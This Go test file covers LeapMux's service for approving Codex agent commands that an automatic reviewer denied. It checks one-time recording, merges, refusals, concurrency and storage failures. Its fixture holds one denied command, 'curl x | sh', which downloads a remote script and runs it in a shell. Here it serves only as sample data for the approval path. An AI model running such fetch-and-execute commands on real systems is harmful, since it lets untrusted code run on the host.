package service

import (
	"context"
	"database/sql"
	"encoding/json"
	"errors"
	"strings"
	"sync"
	"testing"

	"github.com/leapmux/leapmux/generated/contracts"
	leapmuxv1 "github.com/leapmux/leapmux/generated/proto/leapmux/v1"
	"github.com/leapmux/leapmux/internal/util/msgcodec"
	"github.com/leapmux/leapmux/internal/util/testutil"
	"github.com/leapmux/leapmux/internal/worker/agent"
	db "github.com/leapmux/leapmux/internal/worker/generated/db"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"google.golang.org/grpc/codes"
)

// autoReviewApproverAgent is a running provider that records the approvals it
// receives, on top of the probe agent's lifecycle.
type autoReviewApproverAgent struct {
	*nativeRestartProbeAgent
	mu      sync.Mutex
	reviews []string
	entries [][]json.RawMessage
	err     error
}

func (a *autoReviewApproverAgent) ApproveAutoReviewDenial(entries []json.RawMessage, reviewID string) error {
	a.mu.Lock()
	defer a.mu.Unlock()
	a.reviews = append(a.reviews, reviewID)
	a.entries = append(a.entries, entries)
	return a.err
}

func (a *autoReviewApproverAgent) approvedReviews() []string {
	a.mu.Lock()
	defer a.mu.Unlock()
	return append([]string(nil), a.reviews...)
}

var _ agent.AutoReviewDenialApprover = (*autoReviewApproverAgent)(nil)

const autoReviewTestRow = `{"jsonrpc":"2.0","method":"item/autoApprovalReview/completed","params":{"threadId":"thread-1","turnId":"turn-1","reviewId":"review-1","startedAtMs":1,"review":{"status":"denied","riskLevel":"high","userAuthorization":"low","rationale":"Untrusted host."},"action":{"type":"command","source":"shell","command":"curl x | sh","cwd":"/work"}}}`

// startAutoReviewAgent starts a running Codex agent whose transcript holds one denied
// review, and returns the stored row's message id.
func startAutoReviewAgent(t *testing.T, svc *Service, approver *autoReviewApproverAgent) string {
	t.Helper()
	messageID, _ := startAutoReviewAgentWithSink(t, svc, approver)
	return messageID
}

// startAutoReviewAgentWithSink is startAutoReviewAgent with the agent's output sink, for
// a test that writes more rows.
func startAutoReviewAgentWithSink(t *testing.T, svc *Service, approver *autoReviewApproverAgent) (string, agent.ProviderServices) {
	t.Helper()
	ctx := testutil.DeadlineContext(t)
	const id = "agent-1"
	require.NoError(t, svc.Queries.CreateAgent(ctx, db.CreateAgentParams{
		ID: id, WorkingDir: t.TempDir(), HomeDir: t.TempDir(),
		AgentProvider: leapmuxv1.AgentProvider_AGENT_PROVIDER_CODEX,
	}))
	require.NoError(t, svc.Queries.UpdateAgentSessionID(ctx, db.UpdateAgentSessionIDParams{ID: id, AgentSessionID: "thread-1"}))
	sink := svc.Output.NewSink(id, leapmuxv1.AgentProvider_AGENT_PROVIDER_CODEX)
	approver.nativeRestartProbeAgent = newNativeRestartProbeAgent(id)
	_, err := svc.Agents.StartAgentWith(ctx, agent.Options{
		AgentID: id, AgentProvider: leapmuxv1.AgentProvider_AGENT_PROVIDER_CODEX, WorkingDir: t.TempDir(),
	}, sink, func(context.Context, agent.Options, agent.ProviderServices) (agent.Agent, error) {
		return approver, nil
	})
	require.NoError(t, err)
	t.Cleanup(func() { svc.Agents.StopAndWaitAgent(id) })
	sink.UpdateSessionID("thread-1")
	_, err = sink.PersistNotification(leapmuxv1.MessageSource_MESSAGE_SOURCE_AGENT, agent.MessageContent{Original: []byte(autoReviewTestRow)})
	require.NoError(t, err)
	return autoReviewRowID(t, svc, id), sink
}

// recordedApprovals returns the review ids whose approval the stored row records.
func recordedApprovals(t *testing.T, svc *Service, messageID string) []string {
	t.Helper()
	row, err := svc.Queries.GetMessageByAgentAndID(t.Context(), db.GetMessageByAgentAndIDParams{ID: messageID, AgentID: "agent-1"})
	require.NoError(t, err)
	approvals, err := storedAutoReviewApprovals(row)
	require.NoError(t, err)
	return approvals
}

// broadcastApprovals returns the approvals that each broadcast copy of the row states,
// read from the supplement that a browser receives.
func broadcastApprovals(t *testing.T, w *testResponseWriter, messageID string) [][]string {
	t.Helper()
	var states [][]string
	for _, stream := range w.streamsSnapshot() {
		message := decodeWatchAgentEvent(t, stream).GetAgentMessage()
		if message == nil || message.GetId() != messageID {
			continue
		}
		supplement, err := msgcodec.Decompress(message.GetSupplementalContent(), message.GetSupplementalContentCompression())
		require.NoError(t, err)
		var envelope struct {
			Metadata map[string]json.RawMessage `json:"metadata"`
		}
		if len(supplement) > 0 {
			require.NoError(t, json.Unmarshal(supplement, &envelope))
		}
		approvals, err := decodeAutoReviewApprovals(envelope.Metadata[contracts.MessageMetadataFieldAutoReviewApprovals])
		require.NoError(t, err)
		states = append(states, approvals)
	}
	return states
}

func autoReviewRowID(t *testing.T, svc *Service, agentID string) string {
	t.Helper()
	rows, err := svc.Queries.ListAllMessagesByAgentID(t.Context(), db.ListAllMessagesByAgentIDParams{AgentID: agentID, Seq: 0})
	require.NoError(t, err)
	for _, row := range rows {
		if row.Source == leapmuxv1.MessageSource_MESSAGE_SOURCE_AGENT {
			return row.ID
		}
	}
	t.Fatal("the review row was not stored")
	return ""
}

// approvalNotices returns the stored approval notices of an agent.
func approvalNotices(t *testing.T, svc *Service, agentID string) []map[string]any {
	t.Helper()
	rows, err := svc.Queries.ListAllMessagesByAgentID(t.Context(), db.ListAllMessagesByAgentIDParams{AgentID: agentID, Seq: 0})
	require.NoError(t, err)
	var notices []map[string]any
	for _, row := range rows {
		if row.Source != leapmuxv1.MessageSource_MESSAGE_SOURCE_LEAPMUX {
			continue
		}
		entries, err := storedRowEntries(row)
		require.NoError(t, err)
		for _, entry := range entries {
			var notice map[string]any
			require.NoError(t, json.Unmarshal(entry, &notice))
			if notice[contracts.NotificationFieldType] == contracts.NotificationTypeAutoReviewApproved {
				notices = append(notices, notice)
			}
		}
	}
	return notices
}

func approveRequest(messageID, reviewID string) *leapmuxv1.ApproveAutoReviewDenialRequest {
	return &leapmuxv1.ApproveAutoReviewDenialRequest{AgentId: "agent-1", MessageId: messageID, ReviewId: reviewID}
}

func TestApproveAutoReviewDenial_RecordsTheApprovalOnce(t *testing.T) {
	t.Parallel()
	svc, d, watch := setupTestService(t)
	approver := &autoReviewApproverAgent{}
	messageID := startAutoReviewAgent(t, svc, approver)
	registerAgentWatch(svc, "test-ch", "agent-1", leapmuxv1.WatchMode_WATCH_MODE_FULL, watch)

	w := newTestWriter()
	dispatch(d, "ApproveAutoReviewDenial", approveRequest(messageID, "review-1"), w)
	require.Empty(t, w.errors)
	require.Equal(t, []string{"review-1"}, approver.approvedReviews())
	require.Len(t, approver.entries[0], 1, "the provider receives the row's entries, unwrapped")
	assert.JSONEq(t, autoReviewTestRow, string(approver.entries[0][0]))
	assert.Equal(t, []string{"review-1"}, recordedApprovals(t, svc, messageID), "the review row records the approval")
	assert.Contains(t, broadcastApprovals(t, watch, messageID), []string{"review-1"},
		"each browser receives the row again with its approval, so it draws the approval in place")
	notices := approvalNotices(t, svc, "agent-1")
	require.Len(t, notices, 1)
	assert.Equal(t, "review-1", notices[0][contracts.NotificationFieldReviewID])

	// A second approval succeeds without reaching the provider again: the row records
	// the first one.
	again := newTestWriter()
	dispatch(d, "ApproveAutoReviewDenial", approveRequest(messageID, "review-1"), again)
	require.Empty(t, again.errors)
	assert.Equal(t, []string{"review-1"}, approver.approvedReviews())
	assert.Equal(t, []string{"review-1"}, recordedApprovals(t, svc, messageID))
	assert.Len(t, approvalNotices(t, svc, "agent-1"), 1)
}

// TestApproveAutoReviewDenial_TheRowRecordIsTheAuthority covers the notice and the row
// record apart: the record alone refuses a second call to the provider.
func TestApproveAutoReviewDenial_TheRowRecordIsTheAuthority(t *testing.T) {
	t.Parallel()
	svc, _, _ := setupTestService(t)
	approver := &autoReviewApproverAgent{}
	messageID := startAutoReviewAgent(t, svc, approver)
	dbAgent, err := svc.Queries.GetAgentByID(t.Context(), "agent-1")
	require.NoError(t, err)
	require.NoError(t, svc.approveAutoReviewDenial(dbAgent, messageID, "review-1"))

	rows, err := svc.Queries.ListAllMessagesByAgentID(t.Context(), db.ListAllMessagesByAgentIDParams{AgentID: "agent-1", Seq: 0})
	require.NoError(t, err)
	for _, row := range rows {
		if row.Source == leapmuxv1.MessageSource_MESSAGE_SOURCE_LEAPMUX {
			_, err := svc.Queries.DeleteMessageByAgentAndID(t.Context(), db.DeleteMessageByAgentAndIDParams{ID: row.ID, AgentID: "agent-1"})
			require.NoError(t, err)
		}
	}
	require.Empty(t, approvalNotices(t, svc, "agent-1"))

	require.NoError(t, svc.approveAutoReviewDenial(dbAgent, messageID, "review-1"))
	assert.Equal(t, []string{"review-1"}, approver.approvedReviews(), "the row record refuses the second call")
}

// TestApproveAutoReviewDenial_KeepsTheRecordThroughAMerge covers a later review that
// Codex reports right after the approval: the worker merges it into the same row, and
// the merge keeps the row's record.
func TestApproveAutoReviewDenial_KeepsTheRecordThroughAMerge(t *testing.T) {
	t.Parallel()
	svc, _, _ := setupTestService(t)
	approver := &autoReviewApproverAgent{}
	messageID, sink := startAutoReviewAgentWithSink(t, svc, approver)
	require.NoError(t, svc.Output.recordAutoReviewApproval("agent-1", messageID, "review-1"))

	second := strings.Replace(autoReviewTestRow, `"reviewId":"review-1"`, `"reviewId":"review-2"`, 1)
	_, err := sink.PersistNotification(leapmuxv1.MessageSource_MESSAGE_SOURCE_AGENT, agent.MessageContent{Original: []byte(second)})
	require.NoError(t, err)

	row, err := svc.Queries.GetMessageByAgentAndID(t.Context(), db.GetMessageByAgentAndIDParams{ID: messageID, AgentID: "agent-1"})
	require.NoError(t, err)
	entries, err := storedRowEntries(row)
	require.NoError(t, err)
	require.Len(t, entries, 2, "the second review merges into the row of the first one")
	assert.Equal(t, []string{"review-1"}, recordedApprovals(t, svc, messageID))

	dbAgent, err := svc.Queries.GetAgentByID(t.Context(), "agent-1")
	require.NoError(t, err)
	require.NoError(t, svc.approveAutoReviewDenial(dbAgent, messageID, "review-2"))
	require.NoError(t, svc.approveAutoReviewDenial(dbAgent, messageID, "review-1"))
	assert.Equal(t, []string{"review-2"}, approver.approvedReviews(), "only the review without a record reaches the provider")
	assert.Equal(t, []string{"review-1", "review-2"}, recordedApprovals(t, svc, messageID))
}

func TestRecordAutoReviewApproval_RefusesARowThatLeft(t *testing.T) {
	t.Parallel()
	svc, _, _ := setupTestService(t)
	messageID := startAutoReviewAgent(t, svc, &autoReviewApproverAgent{})
	_, err := svc.Queries.DeleteMessageByAgentAndID(t.Context(), db.DeleteMessageByAgentAndIDParams{ID: messageID, AgentID: "agent-1"})
	require.NoError(t, err)

	assert.ErrorIs(t, svc.Output.recordAutoReviewApproval("agent-1", messageID, "review-1"), errAutoReviewRowChanged)
}

func TestDecodeAutoReviewApprovals(t *testing.T) {
	t.Parallel()
	for _, test := range []struct {
		raw     string
		want    []string
		wantErr bool
	}{
		{raw: "", want: nil},
		{raw: `[]`, want: []string{}},
		{raw: `["review-1","review-2"]`, want: []string{"review-1", "review-2"}},
		{raw: `null`, wantErr: true},
		{raw: `"review-1"`, wantErr: true},
		{raw: `[1]`, wantErr: true},
		{raw: `{}`, wantErr: true},
	} {
		got, err := decodeAutoReviewApprovals(json.RawMessage(test.raw))
		if test.wantErr {
			assert.Error(t, err, test.raw)
			continue
		}
		require.NoError(t, err, test.raw)
		assert.Equal(t, test.want, got, test.raw)
	}
}

func TestApproveAutoReviewDenial_Refusals(t *testing.T) {
	t.Parallel()

	leapmuxRowID := func(t *testing.T, svc *Service) string {
		svc.Output.PersistLeapMuxNotification("agent-1", leapmuxv1.AgentProvider_AGENT_PROVIDER_CODEX, map[string]interface{}{
			contracts.NotificationFieldType: contracts.NotificationTypeInterrupted,
		})
		rows, err := svc.Queries.ListAllMessagesByAgentID(t.Context(), db.ListAllMessagesByAgentIDParams{AgentID: "agent-1", Seq: 0})
		require.NoError(t, err)
		for _, row := range rows {
			if row.Source == leapmuxv1.MessageSource_MESSAGE_SOURCE_LEAPMUX {
				return row.ID
			}
		}
		t.Fatal("no LeapMux row")
		return ""
	}
	for _, test := range []struct {
		name        string
		approverErr error
		request     func(t *testing.T, svc *Service, reviewRowID string) *leapmuxv1.ApproveAutoReviewDenialRequest
		wantCode    codes.Code
	}{
		{
			name: "a missing message id",
			request: func(*testing.T, *Service, string) *leapmuxv1.ApproveAutoReviewDenialRequest {
				return approveRequest("", "review-1")
			},
			wantCode: codes.InvalidArgument,
		},
		{
			name: "a missing review id",
			request: func(_ *testing.T, _ *Service, reviewRowID string) *leapmuxv1.ApproveAutoReviewDenialRequest {
				return approveRequest(reviewRowID, "")
			},
			wantCode: codes.InvalidArgument,
		},
		{
			name: "an unknown row",
			request: func(*testing.T, *Service, string) *leapmuxv1.ApproveAutoReviewDenialRequest {
				return approveRequest("no-such-row", "review-1")
			},
			wantCode: codes.NotFound,
		},
		{
			name: "a row that LeapMux wrote",
			request: func(t *testing.T, svc *Service, _ string) *leapmuxv1.ApproveAutoReviewDenialRequest {
				return approveRequest(leapmuxRowID(t, svc), "review-1")
			},
			wantCode: codes.NotFound,
		},
		{
			name:        "a review that the reviewer did not deny",
			approverErr: agent.ErrAutoReviewNotDenied,
			request: func(_ *testing.T, _ *Service, reviewRowID string) *leapmuxv1.ApproveAutoReviewDenialRequest {
				return approveRequest(reviewRowID, "review-1")
			},
			wantCode: codes.FailedPrecondition,
		},
		{
			name:        "a review the provider cannot find",
			approverErr: agent.ErrAutoReviewNotFound,
			request: func(_ *testing.T, _ *Service, reviewRowID string) *leapmuxv1.ApproveAutoReviewDenialRequest {
				return approveRequest(reviewRowID, "review-1")
			},
			wantCode: codes.NotFound,
		},
		{
			name:        "an unexpected provider failure",
			approverErr: errors.New("pipe closed"),
			request: func(_ *testing.T, _ *Service, reviewRowID string) *leapmuxv1.ApproveAutoReviewDenialRequest {
				return approveRequest(reviewRowID, "review-1")
			},
			wantCode: codes.Internal,
		},
	} {
		t.Run(test.name, func(t *testing.T) {
			t.Parallel()
			svc, d, _ := setupTestService(t)
			reviewRowID := startAutoReviewAgent(t, svc, &autoReviewApproverAgent{err: test.approverErr})

			w := newTestWriter()
			dispatch(d, "ApproveAutoReviewDenial", test.request(t, svc, reviewRowID), w)

			require.Len(t, w.errors, 1)
			assert.Equal(t, int32(test.wantCode), w.errors[0].code, w.errors[0].message)
			assert.Empty(t, approvalNotices(t, svc, "agent-1"), "a refusal writes no notice")
			assert.Empty(t, recordedApprovals(t, svc, reviewRowID), "a refusal records no approval")
		})
	}
}

func TestApproveAutoReviewDenial_RefusesASubagent(t *testing.T) {
	t.Parallel()
	svc, d, _ := setupTestService(t)
	ctx := t.Context()
	require.NoError(t, svc.Queries.CreateAgent(ctx, db.CreateAgentParams{
		ID: "root", WorkingDir: t.TempDir(), HomeDir: t.TempDir(), AgentProvider: leapmuxv1.AgentProvider_AGENT_PROVIDER_CODEX,
	}))
	require.NoError(t, svc.Queries.CreateChildAgent(ctx, db.CreateChildAgentParams{
		ID: "child", ParentAgentID: sql.NullString{String: "root", Valid: true}, SpawnSpanID: "spawn-span",
		WorkingDir: t.TempDir(), HomeDir: t.TempDir(), Title: "child", AgentProvider: leapmuxv1.AgentProvider_AGENT_PROVIDER_CODEX,
	}))

	w := newTestWriter()
	dispatch(d, "ApproveAutoReviewDenial", &leapmuxv1.ApproveAutoReviewDenialRequest{AgentId: "child", MessageId: "m", ReviewId: "r"}, w)

	require.Len(t, w.errors, 1)
	assert.Equal(t, int32(codes.FailedPrecondition), w.errors[0].code)
}

func TestApproveAutoReviewDenial_RefusesAConcurrentApproval(t *testing.T) {
	t.Parallel()
	svc, _, _ := setupTestService(t)
	approver := &autoReviewApproverAgent{}
	messageID := startAutoReviewAgent(t, svc, approver)
	dbAgent, err := svc.Queries.GetAgentByID(t.Context(), "agent-1")
	require.NoError(t, err)
	svc.autoReviewApprovals.Store(dbAgent.ID+"\x00review-1", struct{}{})

	err = svc.approveAutoReviewDenial(dbAgent, messageID, "review-1")

	require.ErrorIs(t, err, errAutoReviewApprovalInFlight)
	assert.Empty(t, approver.approvedReviews())
}

func TestRecordAutoReviewApproval_WritesNothingForARecordedReview(t *testing.T) {
	t.Parallel()
	svc, _, _ := setupTestService(t)
	messageID := startAutoReviewAgent(t, svc, &autoReviewApproverAgent{})
	require.NoError(t, svc.Output.recordAutoReviewApproval("agent-1", messageID, "review-1"))
	first, err := svc.Queries.GetMessageByAgentAndID(t.Context(), db.GetMessageByAgentAndIDParams{ID: messageID, AgentID: "agent-1"})
	require.NoError(t, err)

	require.NoError(t, svc.Output.recordAutoReviewApproval("agent-1", messageID, "review-1"))

	again, err := svc.Queries.GetMessageByAgentAndID(t.Context(), db.GetMessageByAgentAndIDParams{ID: messageID, AgentID: "agent-1"})
	require.NoError(t, err)
	assert.Equal(t, first.SupplementalRevision, again.SupplementalRevision, "a recorded review changes no revision")
	assert.Equal(t, []string{"review-1"}, recordedApprovals(t, svc, messageID))
}

// TestApproveAutoReviewDenial_RefusesADamagedRecord covers a record that the worker
// cannot read: the approval fails before it reaches the provider, because the record
// cannot state whether an earlier approval already did.
func TestApproveAutoReviewDenial_RefusesADamagedRecord(t *testing.T) {
	t.Parallel()
	svc, _, _ := setupTestService(t)
	approver := &autoReviewApproverAgent{}
	messageID := startAutoReviewAgent(t, svc, approver)
	row, err := svc.Queries.GetMessageByAgentAndID(t.Context(), db.GetMessageByAgentAndIDParams{ID: messageID, AgentID: "agent-1"})
	require.NoError(t, err)
	supplement, err := parseStoredRowSupplement(row)
	require.NoError(t, err)
	damaged, err := supplement.WithMetadataMember(contracts.MessageMetadataFieldAutoReviewApprovals, json.RawMessage(`"review-1"`))
	require.NoError(t, err)
	compressed, compression := compressOptionalSupplement(damaged)
	_, err = svc.Queries.EnrichMessageContent(t.Context(), db.EnrichMessageContentParams{
		ID: row.ID, AgentID: "agent-1",
		OriginalContent: row.Content, OriginalCompression: row.ContentCompression,
		PreviousRevision:    row.SupplementalRevision,
		SupplementalContent: compressed, SupplementalContentCompression: compression,
		PreviousSupplementalContent:            row.SupplementalContent,
		PreviousSupplementalContentCompression: row.SupplementalContentCompression,
	})
	require.NoError(t, err)
	dbAgent, err := svc.Queries.GetAgentByID(t.Context(), "agent-1")
	require.NoError(t, err)

	err = svc.approveAutoReviewDenial(dbAgent, messageID, "review-1")

	require.ErrorContains(t, err, "must be an array of review ids")
	assert.Empty(t, approver.approvedReviews())
}

// TestApproveAutoReviewDenial_SucceedsWhenARecordFails covers the two writes after
// the provider took the approval. The provider holds it, so the request succeeds, and
// only the record that failed is missing.
func TestApproveAutoReviewDenial_SucceedsWhenARecordFails(t *testing.T) {
	t.Parallel()
	for _, test := range []struct {
		name        string
		trigger     string
		wantRecord  []string
		wantNotices int
	}{
		{
			name:        "the row record",
			trigger:     `CREATE TRIGGER fail_record BEFORE UPDATE OF supplemental_content ON messages WHEN NEW.agent_id='agent-1' BEGIN SELECT RAISE(ABORT, 'record storage failed'); END`,
			wantRecord:  nil,
			wantNotices: 1,
		},
		{
			name:        "the notice",
			trigger:     `CREATE TRIGGER fail_notice BEFORE INSERT ON messages WHEN NEW.agent_id='agent-1' BEGIN SELECT RAISE(ABORT, 'notice storage failed'); END`,
			wantRecord:  []string{"review-1"},
			wantNotices: 0,
		},
	} {
		t.Run(test.name, func(t *testing.T) {
			t.Parallel()
			svc, _, _ := setupTestService(t)
			approver := &autoReviewApproverAgent{}
			messageID := startAutoReviewAgent(t, svc, approver)
			_, err := svc.DB.ExecContext(t.Context(), test.trigger)
			require.NoError(t, err)
			dbAgent, err := svc.Queries.GetAgentByID(t.Context(), "agent-1")
			require.NoError(t, err)

			require.NoError(t, svc.approveAutoReviewDenial(dbAgent, messageID, "review-1"))

			assert.Equal(t, []string{"review-1"}, approver.approvedReviews())
			assert.Equal(t, test.wantRecord, recordedApprovals(t, svc, messageID))
			assert.Len(t, approvalNotices(t, svc, "agent-1"), test.wantNotices)
		})
	}
}
